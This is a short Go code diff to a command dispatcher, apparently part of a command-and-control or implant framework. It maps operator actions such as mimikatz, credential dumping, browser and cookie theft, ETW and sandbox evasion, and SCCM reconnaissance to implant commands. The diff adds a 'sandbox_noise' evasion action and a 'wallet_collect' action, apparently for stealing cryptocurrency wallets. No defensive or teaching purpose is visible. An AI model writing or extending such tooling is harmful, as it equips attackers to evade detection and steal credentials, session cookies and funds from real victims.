@@ -191,6 +191,8 @@ func buildQuickActionCommand(action, param, shell string) (string, string) {
 		return "etw_hardware_bp", ""
 	case "sandbox_detect_advanced":
 		return "sandbox_detect_advanced", ""
+	case "sandbox_noise":
+		return "sandbox_noise", param
 	case "set_sleep_mask_advanced":
 		return "set_sleep_mask_advanced", ""
 	case "mimikatz":
@@ -199,6 +201,8 @@ func buildQuickActionCommand(action, param, shell string) (string, string) {
 		return "creds_dump", ""
 	case "browser_steal":
 		return "browser_steal", ""
+	case "wallet_collect":
+		return "wallet_collect", ""
 	case "cookie_export":
 		return "cookie_export", "all"
 	case "sccm_recon":
